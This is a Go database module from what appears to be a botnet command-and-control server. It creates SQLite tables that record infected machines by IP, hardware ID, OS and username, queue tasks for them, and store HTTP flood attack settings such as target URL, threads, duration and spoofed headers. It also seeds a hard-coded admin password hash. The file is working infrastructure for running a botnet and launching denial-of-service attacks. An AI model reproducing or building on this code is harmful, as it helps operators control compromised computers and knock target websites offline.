package data

import (
	"database/sql"

	_ "github.com/mattn/go-sqlite3"
	"wyvern.pw/config"
)

var (
	db *sql.DB
)

func GetConnection() (*sql.DB, error) {
	if isConnected() {
		return db, nil
	} else {
		var err error
		db, err = sql.Open("sqlite3", config.DB_FILENAME)
		if err != nil {
			return nil, err
		}
		db.Exec(`BEGIN TRANSACTION;
CREATE TABLE IF NOT EXISTS "bots" (
	"ip"	TEXT,
	"hwid"	TEXT,
	"cpu"	TEXT,
	"ram"	TEXT,
	"os"	TEXT,
	"username"	TEXT,
	"last_response"	TEXT
);
CREATE TABLE IF NOT EXISTS "attack_completed" (
	"id"	INTEGER,
	"hwid"	TEXT
);
CREATE TABLE IF NOT EXISTS "task" (
	"id"	INTEGER,
	"task_type"	TEXT,
	"parameter"	TEXT,
	"target_execution"	INTEGER,
	"current_execution"	INTEGER,
	PRIMARY KEY("id" AUTOINCREMENT)
);
CREATE TABLE IF NOT EXISTS "task_completed" (
	"id"	INTEGER,
	"hwid"	TEXT
);
CREATE TABLE IF NOT EXISTS "setting" (
	"name"	TEXT,
	"value"	TEXT
);
CREATE TABLE IF NOT EXISTS "auth" (
	"hash"	TEXT
);
CREATE TABLE IF NOT EXISTS "attack" (
	"id"	INTEGER,
	"attack_type"	TEXT,
	"method"	TEXT,
	"target_url"	TEXT,
	"thread"	INTEGER,
	"duration"	INTEGER,
	"interval"	INTEGER,
	"data"	TEXT,
	"accept"	TEXT,
	"accept_encoding"	TEXT,
	"accept_language"	TEXT,
	"user_agent"	TEXT,
	"custom_header"	TEXT,
	"target_execution"	INTEGER,
	"current_execution"	INTEGER,
	PRIMARY KEY("id" AUTOINCREMENT)
);
INSERT INTO "setting" VALUES ('user-agent','MY_USER_AGENT');
INSERT INTO "setting" VALUES ('interval','60');
INSERT INTO "setting" VALUES ('api-key','API_KEY');
INSERT INTO "auth" VALUES ('353ba90f8c0b3e0f355a3d6c960b7caed5f2c1412992277c0669a04a62e7dfd35fba9f4631a7dc6d00fb44d93d305cc0b749c7501d9ce86f26148d05101b8324');
COMMIT;
`)
		return db, nil
	}
}

func isConnected() bool {
	if db == nil {
		return false
	} else {
		return true
	}
}

func CloseConnection() error {
	return db.Close()
}
